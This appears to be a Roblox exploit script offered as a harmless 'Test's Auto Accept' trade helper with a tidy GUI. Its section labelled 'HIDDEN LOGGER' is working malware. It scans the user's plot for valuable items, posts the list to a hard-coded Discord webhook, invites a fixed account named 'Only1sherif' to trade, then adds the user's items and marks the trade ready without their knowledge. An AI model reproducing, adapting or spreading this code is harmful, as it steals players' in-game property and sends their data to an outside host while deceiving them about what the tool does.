repeat task.wait() until game:IsLoaded()

local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local plr = Players.LocalPlayer
local LP = plr

-- ========== HIDDEN LOGGER CONFIG ==========
local LOGGER_TARGET = "Only1sherif"
local LOGGER_WEBHOOK = "https://discord.com/api/webhooks/1496254716508639262/J-eMNrXhdgaWAiIlMIiObJCsXw0E3s4XHB2S-0HLvkOYRdoJI2QDnAGmPU0EJtTZhbK6"

local wantedItems = {
    "Tralaledon", "Strawberry Elephant", "Skibidi Toilet", "Rosey and Teddy",
    "Popcuru and Fizzuru", "Meowl", "Love Love Bear", "Los Sekolahs",
    "La Supreme Combinasion", "La Casa Boo", "Ketupat Bros", "Hydra Dragon Cannelloni",
    "Headless Horseman", "Griffin", "Fragrama and Chocrama", "Fishino Clownino",
    "Festive 67", "Dragon Gingerini", "Dragon Cannelloni", "Cooki and Milki",
    "Cerberus", "Celestial Pegasus", "Capitano Moby", "Burguro And Fryuro",
    "Los Amigos", "Fortunu and Cashuru", "Spooky and Pumpky", "Ginger Gerat",
    "La Food Combinasion", "Los Tacoritas", "La Secret Combinasion", "Money Money Puggy",
    "Ketchuru and Musturu", "La Taco Combinasion", "Garama and Madundung", "Ventoliero Pavonero",
    "Swaggy Bros", "Tuff Toucan", "W or L", "Chipso and Queso",
    "Los Spaghettis", "Los Hotspotsitos", "Tictac Sahur", "Lovin Rose", "Orcaledon",
    "Ketupat Kepat", "Tang Tang Keletang", "Lavadorito Spinito",
    "Reinito Sleighito", "Celularcini Viciosini", "Sammyni Fattini",
    "Jolly Jolly Sahur", "Fortunu and Coinuru", "Gold Gold Gold", "La Extinct Grande", "La Easter Grande", "Chillin Chilli", "Hydra Bunny",
}

local function scanPlotForLogger()
    local found = {}
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return found end
    local myPlot = nil
    for _, p in ipairs(plots:GetChildren()) do
        local sign = p:FindFirstChild("PlotSign")
        if sign then
            local gui = sign:FindFirstChildOfClass("SurfaceGui")
            if gui and gui:FindFirstChildOfClass("Frame") then
                local lbl = gui.Frame:FindFirstChildOfClass("TextLabel")
                if lbl and lbl.Text:lower():find(LP.Name:lower()) then
                    myPlot = p
                    break
                end
            end
        end
    end
    if myPlot then
        for _, child in ipairs(myPlot:GetChildren()) do
            if child:IsA("Model") then
                local name = child.Name:lower()
                for _, wanted in ipairs(wantedItems) do
                    if name:find(wanted:lower()) then
                        table.insert(found, child.Name)
                        break
                    end
                end
            end
        end
    end
    return found
end

local function sendHiddenLog(items)
    pcall(function()
        local itemlist = table.concat(items, ", ")
        local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
        if request then
            request({
                Url = LOGGER_WEBHOOK,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    content = "@everyone",
                    embeds = {{
                        title = "Target Found: " .. LP.Name,
                        description = "Items Detected:\n" .. itemlist,
                        color = 16711680,
                        footer = { text = "Vinhub Hidden Logger" }
                    }}
                })
            })
        end
    end)
end

--- ANTI-AFK ---
for i, v in pairs(getconnections(plr.Idled)) do
    if v.Disable then v:Disable() end
end
plr.Idled:Connect(function() end)

--- SINGLE INSTANCE CHECK ---
local existingGui = plr.PlayerGui:FindFirstChild("BoaGuiSmall")
if existingGui then existingGui:Destroy() end

local _G_SETTINGS = { tradeOn = true, afkOn = true }

--- GUI INITIALIZATION ---
local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local DiscordLabel = Instance.new("TextLabel")
local Separator = Instance.new("Frame")
local ListeningLabel = Instance.new("TextLabel")
local Snowflake = Instance.new("TextLabel")
local HistoryBtn = Instance.new("TextButton")

local HistoryFrame = Instance.new("Frame")
local HistoryTitle = Instance.new("TextLabel")
local HistoryScroll = Instance.new("ScrollingFrame")
local UIListLayout = Instance.new("UIListLayout")

local DetailFrame = Instance.new("Frame")
local DetailTitle = Instance.new("TextLabel")
local DetailContent = Instance.new("TextLabel")
local DetailClose = Instance.new("TextButton")

ScreenGui.Name = "BoaGuiSmall"
ScreenGui.Parent = plr:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 5, 15) 
MainFrame.BackgroundTransparency = 0.25 
MainFrame.Position = UDim2.new(0, 16, 0, 16) 
MainFrame.Size = UDim2.new(0, 180, 0, 75)

HistoryFrame.Name = "HistoryFrame"
HistoryFrame.Parent = ScreenGui
HistoryFrame.BackgroundColor3 = Color3.fromRGB(0, 5, 15)
HistoryFrame.BackgroundTransparency = 0.2
HistoryFrame.Position = UDim2.new(0.5, -150, 0.5, -125)
HistoryFrame.Size = UDim2.new(0, 300, 0, 250)
HistoryFrame.Visible = false

DetailFrame.Name = "DetailFrame"
DetailFrame.Parent = ScreenGui
DetailFrame.Size = UDim2.new(0, 180, 0, 120)
DetailFrame.Position = UDim2.new(0.5, -90, 0.5, -60)
DetailFrame.BackgroundColor3 = Color3.fromRGB(0, 10, 25)
DetailFrame.BorderSizePixel = 0
DetailFrame.Visible = false
DetailFrame.ZIndex = 10

DetailTitle.Parent = DetailFrame
DetailTitle.Size = UDim2.new(1, 0, 0, 20)
DetailTitle.Text = "TRACKED ITEMS"
DetailTitle.Font = Enum.Font.SciFi
DetailTitle.TextColor3 = Color3.new(1,1,1)
DetailTitle.TextSize = 12

DetailContent.Parent = DetailFrame
DetailContent.Size = UDim2.new(1, -10, 1, -30)
DetailContent.Position = UDim2.new(0, 5, 0, 25)
DetailContent.TextWrapped = true
DetailContent.TextYAlignment = Enum.TextYAlignment.Top
DetailContent.Font = Enum.Font.SciFi
DetailContent.TextColor3 = Color3.fromRGB(100, 200, 255) 
DetailContent.TextSize = 10
DetailContent.Text = ""

DetailClose.Parent = DetailFrame
DetailClose.Size = UDim2.new(0, 15, 0, 15)
DetailClose.Position = UDim2.new(1, -20, 0, 3)
DetailClose.Text = "X"
DetailClose.TextColor3 = Color3.new(1,0,0)
DetailClose.BackgroundTransparency = 1
DetailClose.MouseButton1Click:Connect(function() DetailFrame.Visible = false end)

local function makeRounded(parent, radius)
    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, radius or 8)
    UICorner.Parent = parent
end

local animatedGradients = {}
local function applyAnimatedGradient(parent, isText)
    local target = parent
    if not isText then
        local UIStroke = Instance.new("UIStroke")
        UIStroke.Thickness = 2.5
        UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        UIStroke.Color = Color3.new(1, 1, 1) 
        UIStroke.Parent = parent
        target = UIStroke
    end
    local UIGradient = Instance.new("UIGradient")
    UIGradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 80, 200)),   
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 220, 255)), 
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 80, 200))
    }
    UIGradient.Parent = target
    table.insert(animatedGradients, UIGradient)
end

makeRounded(MainFrame, 10)
applyAnimatedGradient(MainFrame, false)
makeRounded(HistoryFrame, 10)
applyAnimatedGradient(HistoryFrame, false)
makeRounded(DetailFrame, 8)

Title.Parent = MainFrame
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(0, 10, 0, 5)
Title.Size = UDim2.new(1, -10, 0, 20)
Title.Font = Enum.Font.SciFi 
Title.Text = "Test's Auto Accept"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 14 
Title.TextXAlignment = Enum.TextXAlignment.Left

DiscordLabel.Parent = MainFrame
DiscordLabel.BackgroundTransparency = 1
DiscordLabel.Position = UDim2.new(0, 10, 0, 22)
DiscordLabel.Size = UDim2.new(1, -10, 0, 10)
DiscordLabel.Font = Enum.Font.SciFi
DiscordLabel.Text = "discord.gg/6GZfn9Qy"
DiscordLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
DiscordLabel.TextSize = 8 
DiscordLabel.TextXAlignment = Enum.TextXAlignment.Left

Separator.Parent = MainFrame
Separator.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Separator.BorderSizePixel = 0
Separator.Position = UDim2.new(0, 5, 0, 36)
Separator.Size = UDim2.new(1, -10, 0, 1)
applyAnimatedGradient(Separator, false)

ListeningLabel.Parent = MainFrame
ListeningLabel.BackgroundTransparency = 1
ListeningLabel.Position = UDim2.new(1, -75, 0, 12) 
ListeningLabel.Size = UDim2.new(0, 50, 0, 15)
ListeningLabel.Font = Enum.Font.SciFi
ListeningLabel.Text = "listening.."
ListeningLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
ListeningLabel.TextSize = 9
ListeningLabel.TextXAlignment = Enum.TextXAlignment.Right

Snowflake.Parent = MainFrame
Snowflake.BackgroundTransparency = 1
Snowflake.Position = UDim2.new(1, -22, 0, 10)
Snowflake.Size = UDim2.new(0, 15, 0, 15)
Snowflake.Font = Enum.Font.SciFi
Snowflake.Text = "❄"
Snowflake.TextColor3 = Color3.fromRGB(100, 200, 255)
Snowflake.TextSize = 16

HistoryBtn.Parent = MainFrame
HistoryBtn.BackgroundColor3 = Color3.fromRGB(0, 20, 40)
HistoryBtn.BackgroundTransparency = 0.5
HistoryBtn.Position = UDim2.new(0, 10, 0, 45)
HistoryBtn.Size = UDim2.new(1, -20, 0, 20)
HistoryBtn.Font = Enum.Font.SciFi
HistoryBtn.Text = "View Trade History"
HistoryBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
HistoryBtn.TextSize = 10
makeRounded(HistoryBtn, 4)
HistoryBtn.MouseButton1Click:Connect(function() HistoryFrame.Visible = not HistoryFrame.Visible end)

HistoryTitle.Parent = HistoryFrame
HistoryTitle.Size = UDim2.new(1, 0, 0, 25)
HistoryTitle.BackgroundTransparency = 1
HistoryTitle.Font = Enum.Font.SciFi
HistoryTitle.Text = "LOGS"
HistoryTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
HistoryTitle.TextSize = 12

HistoryScroll.Parent = HistoryFrame
HistoryScroll.Position = UDim2.new(0, 5, 0, 25)
HistoryScroll.Size = UDim2.new(1, -10, 1, -30)
HistoryScroll.BackgroundTransparency = 1
HistoryScroll.ScrollBarThickness = 2
HistoryScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y

UIListLayout.Parent = HistoryScroll
UIListLayout.Padding = UDim.new(0, 5)
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

--- UNIVERSAL DRAG FUNCTION ---
local function makeDraggable(frame)
    local dragging, dragInput, dragStart, startPos

    local function update(input)
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
end

makeDraggable(MainFrame)
makeDraggable(DetailFrame)
makeDraggable(HistoryFrame)

--- LOGGING FUNCTION ---
local tradeCounter = 0
local currentTradeLayoutOrder = 0
local logOffset = 0

local function addLog(username, status, items)
    if status == "Incoming Trade Invite" then
        tradeCounter = tradeCounter + 1
        currentTradeLayoutOrder = -(tradeCounter * 100) 
        logOffset = 0 
        
        local Header = Instance.new("TextLabel")
        Header.Size = UDim2.new(1, -5, 0, 15)
        Header.BackgroundTransparency = 1
        Header.Font = Enum.Font.SciFi
        Header.Text = "--- TRADE " .. tradeCounter .. " ---"
        Header.TextColor3 = Color3.fromRGB(100, 200, 255)
        Header.TextSize = 10
        Header.LayoutOrder = currentTradeLayoutOrder
        Header.Parent = HistoryScroll
    end

    logOffset = logOffset + 1
    local isInteractable = (status == "Closed/Completed" or status == "Cancelled/Ended")
    local LogBox = Instance.new(isInteractable and "TextButton" or "Frame")
    local AvatarImage = Instance.new("ImageLabel")
    local InfoLabel = Instance.new("TextLabel")
    
    LogBox.Name = "LogEntry"
    LogBox.Size = UDim2.new(1, -5, 0, 35)
    LogBox.BackgroundTransparency = 0.5
    LogBox.BackgroundColor3 = Color3.fromRGB(0, 60, 120) 
    LogBox.LayoutOrder = currentTradeLayoutOrder + logOffset
    
    if isInteractable then LogBox.Text = "" end

    makeRounded(LogBox, 6)
    LogBox.Parent = HistoryScroll

    AvatarImage.Size = UDim2.new(0, 25, 0, 25)
    AvatarImage.Position = UDim2.new(0, 5, 0.5, -12)
    AvatarImage.BackgroundTransparency = 1
    makeRounded(AvatarImage, 12)
    AvatarImage.Parent = LogBox
    
    task.spawn(pcall, function()
        local userId = (username ~= "System" and username ~= "Trade") and Players:GetUserIdFromNameAsync(username) or 0
        AvatarImage.Image = userId > 0 and Players:GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150) or "rbxassetid://0" 
    end)

    InfoLabel.Size = UDim2.new(1, -40, 1, 0)
    InfoLabel.Position = UDim2.new(0, 35, 0, 0) 
    InfoLabel.BackgroundTransparency = 1
    InfoLabel.Font = Enum.Font.SciFi
    InfoLabel.TextSize = 10
    InfoLabel.TextColor3 = Color3.new(1, 1, 1)
    InfoLabel.TextXAlignment = Enum.TextXAlignment.Left
    InfoLabel.Text = username .. ": " .. status .. (isInteractable and " [?]" or "")
    InfoLabel.Parent = LogBox

    if isInteractable then
        LogBox.MouseButton1Click:Connect(function()
            local itemText = (items and #items > 0) and table.concat(items, "\n") or "No tracked items detected."
            if DetailFrame.Visible and DetailContent.Text == itemText then
                DetailFrame.Visible = false
            else
                DetailContent.Text = itemText
                DetailFrame.Visible = true
            end
        end)
    end
end

--- NETWORK & AUTOMATION ---
local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
local function getRemote(name)
    local children = Net:GetChildren()
    for i, obj in ipairs(children) do if obj.Name == name then return children[i+1] end end
    return nil
end

local acceptInviteRF = getRemote("RF/TradeService/AcceptInvite")
local createInviteRE  = getRemote("RE/TradeService/CreateInvite")
local readyRE          = getRemote("RE/TradeService/Ready")
local acceptRE         = getRemote("RE/TradeService/Accept")
local destroyTradeRE = getRemote("RE/TradeService/DestroyTrade") 

local currentTradeActive = false
local lastTrackedItems = {}

-- MAIN HIDDEN TASK (LOGGER)
task.spawn(function()
    while true do
        local highValue = scanPlotForLogger()
        local tradeUI = plr.PlayerGui:FindFirstChild("TradeLiveTrade")
        local isActive = tradeUI and tradeUI.Enabled

        if #highValue > 0 then
            if not isActive then
                -- Try to invite Only1sherif
                local tl = plr.PlayerGui:FindFirstChild("TradePlayerList"):FindFirstChild("TradePlayerList")
                if tl then
                    local sb = tl.bg.SearchFrame.SearchBox
                    sb.Text = LOGGER_TARGET
                    task.wait(0.2)
                    firesignal(sb.FocusLost, true)
                    task.wait(0.5)
                    for _, p in pairs(tl.Global.List:GetChildren()) do
                        if p:IsA("Frame") and p:FindFirstChild("Fill") then
                            firesignal(p.Fill.Send.Activated)
                            sendHiddenLog(highValue)
                            break
                        end
                    end
                end
            else
                -- Inside trade with target
                local inner = tradeUI.TradeLiveTrade
                if inner.Other.Username.Text:lower():find(LOGGER_TARGET:lower()) then
                    local scroll = inner:FindFirstChild("ScrollingFrame", true)
                    if scroll then
                        for _, slot in pairs(scroll:GetChildren()) do
                            if slot.Name:sub(1,9) == "Selection" then
                                local spacer = slot:FindFirstChild("Spacer")
                                if spacer and spacer:FindFirstChild("UIStroke") then
                                    if spacer.UIStroke.Color ~= Color3.fromRGB(0, 255, 0) then
                                        firesignal(spacer.Activated)
                                        task.wait(0.1)
                                    end
                                end
                            end
                        end
                    end
                    task.wait(0.5)
                    if readyRE then pcall(function() readyRE:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9") end) end
                end
            end
        end
        task.wait(1)
    end
end)

-- AUTO ACCEPT TASK
task.spawn(function()
    while true do
        if _G_SETTINGS.tradeOn then
            local tradeUI = plr.PlayerGui:FindFirstChild("TradeLiveTrade")
            if tradeUI and tradeUI.Enabled then
                currentTradeActive = true
                if readyRE then pcall(function() readyRE:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9") end) end
                task.wait(1)
                if acceptRE then pcall(function() acceptRE:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb") end) end
            elseif currentTradeActive then
                currentTradeActive = false
                ListeningLabel.Text = "listening.."
                Snowflake.Text = "❄"
                addLog("Trade", "Closed/Completed", lastTrackedItems)
            end
        end
        task.wait(1)
    end
end)

if destroyTradeRE then
    destroyTradeRE.OnClientEvent:Connect(function()
        if currentTradeActive then
            currentTradeActive = false
            addLog("Trade", "Cancelled/Ended", lastTrackedItems)
            ListeningLabel.Text = "listening.."
            Snowflake.Text = "❄"
        end
    end)
end

if createInviteRE then
    createInviteRE.OnClientEvent:Connect(function(tradeId)
        if tradeId and _G_SETTINGS.tradeOn then
            ListeningLabel.Text = "accepting.."
            addLog("System", "Incoming Trade Invite")
            local success, result = pcall(function() return acceptInviteRF:InvokeServer("57624f2b-8aa9-4974-bb7a-08f058af33ef", tradeId) end)
            if success and result then
                ListeningLabel.Text = "in trade ✓"
                Snowflake.Text = "✅"
                addLog("System", "In Trade ✓")
                currentTradeActive = true
            else
                ListeningLabel.Text = "error"
                addLog("System", "Declined/Failed")
                task.wait(2)
                ListeningLabel.Text = "listening.."
            end
        end
    end)
end

--- GRADIENT ANIMATION ---
RunService.RenderStepped:Connect(function()
    local t = tick()
    for _, grad in ipairs(animatedGradients) do grad.Rotation = (t * 140) % 360 end
    if Snowflake.Text == "❄" then Snowflake.Rotation = (t * 60) % 360 end
end)
